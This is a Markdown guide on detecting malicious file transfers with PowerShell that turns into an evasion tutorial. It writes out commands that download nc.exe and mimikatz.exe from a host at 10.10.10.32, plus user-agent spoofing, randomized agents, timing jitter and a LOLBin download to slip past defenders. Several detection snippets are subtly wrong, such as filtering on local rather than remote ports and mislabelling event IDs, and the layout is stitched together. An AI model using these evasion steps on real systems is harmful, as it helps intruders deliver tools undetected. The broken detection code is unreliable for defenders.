# 🛰️ Detecting Malicious File Transfers Using PowerShell

## Overview

Malicious file transfers are a critical aspect of cybersecurity, often used by attackers to exfiltrate sensitive data or deliver malware onto target systems. PowerShell offers various methods for detecting and analyzing these activities through network monitoring, process analysis, and behavioral detection techniques.

[!WARNING] **Note:** This guide contains information that can be used maliciously. Use responsibly in a legal context such as red team exercises, security assessments, or penetration testing with explicit permission.

## Detection Methods

### 1. Network Monitoring
Detecting file transfers based on network traffic provides real-time insights into data exfiltration and inbound/outbound connections.

#### PowerShell Commands for Network Monitoring

```powershell
# List current TCP/UDP sessions
Get-NetTCPConnection -State Established,Listen | Where-Object {$_.RemoteAddress -ne $null} | ft LocalPort, RemoteAddress, RemotePort, State -AutoSize

## Filter established UDP sessions
Get-NetUDPEndpoint | Where-Object { $_.RemoteAddress -ne $null } | ft LocalPort, RemoteAddress, RemotePort, State -AutoSize
```

[!INFO] **Note:** The above commands require administrative privileges to access network connection details.

#### PowerShell Script for Monitoring Outbound Connections

```powershell
# Monitor outbound connections in real-time
$connections = Get-NetTCPConnection -State Established | Where-Object { $_.RemoteAddress -ne $null } | ft LocalPort, RemoteAddress, RemotePort -AutoSize
Write-Output "Outbound TCP Sessions:"
$connections

## Example: Monitoring HTTP/HTTPS traffic specifically
Get-NetTCPConnection -State Established | 
Where-Object {$_.LocalPort -eq 80 -or $_.LocalPort -eq 443} |
ft LocalAddress, RemoteAddress, State -AutoSize
```

### 5. Command-Line Analysis

Monitoring the command line used by PowerShell and other tools can provide insights into potentially malicious activity.

#### PowerShell Script for Analyzing Command Line Arguments

```powershell
# Monitor PowerShell commands with suspicious arguments
Get-Process | Where-Object { $_.Path -like 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' } |
Select-Object Id, ProcessName, @{Name="Command";Expression={$_.CommandLine}} | 
Where-Object {$_.Command -like "*Invoke-WebRequest*"} | ft
```

### 6. File Transfer Analysis

Analyzing files transferred via PowerShell can help identify malicious payloads.

#### PowerShell Script for Monitoring Suspicious Files

```powershell
# Monitor file creations in specific directories
Get-WinEvent -FilterHashtable @{LogName='Security';ID=4658} | 
Where-Object {$_.Message -like "*C:\Users\Public*"} |
Select-Object TimeCreated, @{n="User";e={$($_.Properties[5].Value)}}, Message

## Detect files transferred via PowerShell
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-DNS-Client/Operational'} | 
Where-Object {$_.Message -like "*suspicious-domain.com*"}
```

## Advanced Detection Techniques

### 1. Behavioral Analysis

**File Creation Patterns:**
- Monitor for files created in unusual locations
- Look for executable files downloaded to temp directories
- Monitor for files with suspicious extensions

**Network Behavior:**
- Monitor for unusual outbound connections
- Look for connections to known malicious IPs
- Monitor for data exfiltration patterns

### 2. Machine Learning Detection

**Anomaly Detection:**
- Train models on normal file transfer patterns
- Detect deviations from normal behavior
- Reduce false positives through continuous learning

**User Behavior Analytics:**
- Monitor for users performing unusual file transfers
- Look for transfers outside normal business hours
- Monitor for transfers to unusual destinations

### 3. Threat Intelligence Integration

**IOC Matching:**
- Compare user agents against known malicious signatures
- Check domains against threat intelligence feeds
- Monitor for known malicious file hashes

**Attribution:**
- Link detected activity to known threat actors
- Identify campaign patterns and techniques
- Enhance detection based on threat actor TTPs

## Best Practices

### 1. Layered Detection

- Implement multiple detection methods
- Don't rely on single detection technique
- Combine network, host, and behavioral detection

### 2. Continuous Monitoring

- Monitor file transfer activity 24/7
- Implement real-time alerting
- Regular review and tuning of detection rules

### 3. Regular Updates

- Keep user agent baselines current
- Update detection rules regularly
- Incorporate new threat intelligence

### 4. Response Planning

- Develop incident response procedures
- Plan for containment and eradication
- Practice response scenarios regularly

## Evading Detection

### Changing User Agent

If administrators have blacklisted specific user agents, `Invoke-WebRequest` contains a `UserAgent` parameter that allows changing the default user agent to emulate different browsers. This can make requests appear legitimate.

### Listing Available User Agents

```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
```

**Available User Agents:**
- **InternetExplorer:** `Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)`
- **FireFox:** `Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0`
- **Chrome:** `Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6`
- **Opera:** `Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1`
- **Safari:** `Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16`

### Using Chrome User Agent

```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

**Server Detection (with Chrome User Agent):**
```http
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive
```

### LOLBAS / GTFOBins

Application whitelisting may prevent using PowerShell or Netcat, and command-line logging may alert defenders. In such cases, "LOLBIN" (Living Off The Land Binary) or "misplaced trust binaries" can be used.

**Example - Intel Graphics Driver:**
```powershell
GfxDownloadWrapper.exe "http://10.10.10.32/mimikatz.exe" "C:\Temp\nc.exe"
```

**Benefits of LOLBins:**
- May be permitted by application whitelisting
- Often excluded from alerting systems
- Appear as legitimate system processes
- Difficult to detect without proper monitoring

**Resources:**
- **LOLBAS Project:** Windows Living Off The Land Binaries
- **GTFOBins Project:** Linux equivalent (~40 binaries for file transfers)

### Additional Evasion Techniques

**Custom User Agent Strings:**
```powershell
$CustomAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $CustomAgent -OutFile "C:\Users\Public\nc.exe"
```

**Randomized User Agents:**
```powershell
$agents = @(
    [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome,
    [Microsoft.PowerShell.Commands.PSUserAgent]::Firefox,
    [Microsoft.PowerShell.Commands.PSUserAgent]::Safari
)
$randomAgent = $agents | Get-Random
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $randomAgent -OutFile "C:\Users\Public\nc.exe"
```

**Timing Evasion:**
```powershell
# Add delays to avoid pattern detection
Start-Sleep -Seconds (Get-Random -Minimum 1 -Maximum 5)
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

### Common Evasion Strategies

1. **User Agent Rotation:** Rotate between different legitimate user agents
2. **Timing Variation:** Add random delays between requests
3. **Request Headers:** Modify additional headers to appear legitimate
4. **LOLBINS & GTFOBins:** Use system binaries and utilities to avoid detection
5. **Splitting Traffic:** Break up large transfers into smaller chunks

## Conclusion

Detecting malicious file transfers involves a combination of network monitoring, command-line analysis, behavioral detection techniques, and continuous threat intelligence updates. By employing these methods, organizations can better protect against data exfiltration and malware delivery.

---

# 🛠️ Evading Detection

[!WARNING] **Note:** The following information is intended for ethical hacking purposes only. Unauthorized use of these techniques may violate laws and regulations. Always ensure you have explicit permission to test systems within your scope of engagement.

## Additional Resources

- [LOLBAS Project](https://lolbas-project.github.io/)
- [GTFOBins](https://gtfobins.github.io/)

---

[!WARNING] **Disclaimer:** This guide is for educational and ethical purposes only. Unauthorized use may lead to legal consequences. Always obtain proper authorization before conducting any security assessments or penetration tests.

--- 

# 📚 References

1. Microsoft Docs: [Get-NetTCPConnection](https://docs.microsoft.com/en-us/powershell/module/nettcpconnection/get-nettcpconnection?view=windowsserver2022-ps)
2. Microsoft Docs: [Event Viewer Logs](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4658)
3. LOLBAS Project
4. GTFOBins

---

[!INFO] **Note:** Ensure that all security assessments and penetration testing activities are conducted within the legal scope of engagement and with proper authorization from stakeholders.

--- 

# 🛡️ Legal Disclaimer

This guide is provided for informational purposes only. The authors do not endorse or condone any unauthorized use of these techniques without explicit permission. Users must comply with all applicable laws, regulations, and ethical guidelines when using this information. Unauthorized access to computer systems is illegal and unethical.

--- 

[!INFO] **Note:** Always obtain proper authorization before conducting any security assessments or penetration tests. Unauthorized testing may result in legal penalties and damage relationships with stakeholders. Follow the [OWASP Top Ten](https://owasp.org/www-project-top-ten/) guidelines for ethical hacking practices.